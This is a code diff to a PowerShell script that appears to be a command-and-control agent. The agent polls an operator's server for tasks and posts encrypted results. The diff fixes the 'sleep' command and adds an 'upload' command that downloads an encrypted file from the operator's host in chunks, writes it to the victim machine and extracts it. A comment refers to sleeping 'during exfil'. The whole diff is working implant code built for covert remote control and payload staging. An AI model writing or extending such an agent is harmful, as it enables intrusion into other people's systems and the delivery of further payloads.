@@ -108,6 +108,7 @@ if ($flag -eq "VALID"){
 sleep $n
 
 $resultl = ("http" + ':' + "//$ip" + ':' + "$port/results/")
+$uploadl = ("http" + ':' + "//$ip" + ':' + "$port/upload/")
 
 for (;;){
 
@@ -168,8 +169,8 @@ for (;;){
             elseif ($command -eq "sleep"){
 
                 $n    = [int]$args[0]
-                $res = "sleep set to " + "$args[0]" + "sec"
-                $res  = Encrypt-String $key
+                $res = "sleep set to " + "$args" + "sec"
+                $res  = Encrypt-String $key $res
                 $data = @{result = "$res"}
                 $resultfl = ("$resultl" + "$taskId")
                 Invoke-WebRequest -UseBasicParsing -Uri $resultfl -Body $data -Method 'POST'
@@ -182,6 +183,50 @@ for (;;){
                 $data    = @{result = "$res"}
                 $resultfl = ("$resultl" + "$taskId")
                 Invoke-WebRequest -UseBasicParsing -Uri $resultfl -Body $data -Method 'POST'
+            }
+            elseif ($command -eq "upload"){
+                $file    = $args
+                $uploadfl = ("$uploadl" + "$file")
+                $data    = @{
+                    part = "init"
+                    name = "$name"
+                    }
+                $total_parts = (Invoke-WebRequest -UseBasicParsing -Uri $uploadfl -Body $data -Method 'POST').Content
+                $total_parts = Decrypt-String $key $total_parts
+                $xx = $total_parts.split()
+                if ($xx[0] -eq 'VALID') {
+                    if (Test-Path $file) {
+                        Remove-Item -Recurse -Force $file
+                    }
+                    for ($i=0; $i -le $xx[1]-1; $i=$i+1 ) {
+                        # keep sleeping during exfil
+                        sleep $n
+                        
+                        $data    = @{
+                            part = "$i"
+                            name = "$name"
+                            }
+                        $part = (Invoke-WebRequest -UseBasicParsing -Uri $uploadfl -Body $data -Method 'POST').Content
+                        $dec_part_b64 = (Decrypt-String $key $part )
+                        if ($dec_part_b64.split()[0] -eq 'VALID') {
+                            $bytes = [System.Convert]::FromBase64String($dec_part_b64.split()[1])
+                            add-content -value $bytes -encoding byte -path $file
+                        }
+                    }
+
+                    $final_file = $file.Substring(0, $file.lastIndexOf('.'))
+                    if (Test-Path $final_file) {
+                        Remove-Item -Recurse -Force $final_file
+                    }
+                    Expand-Archive -Path "$file" -DestinationPath .
+                    Remove-Item -Recurse -Force "$file"
+
+                    $res = "VALID file uploades - " + "$final_file"
+                    $res  = Encrypt-String $key $res
+                    $data    = @{result = "$res"}
+                    $resultfl = ("$resultl" + "$taskId")
+                    Invoke-WebRequest -UseBasicParsing -Uri $resultfl -Body $data -Method 'POST'
+                }
             }
             elseif ($command -eq "quit"){
                 $res = "VALID agent dead " + "$name"
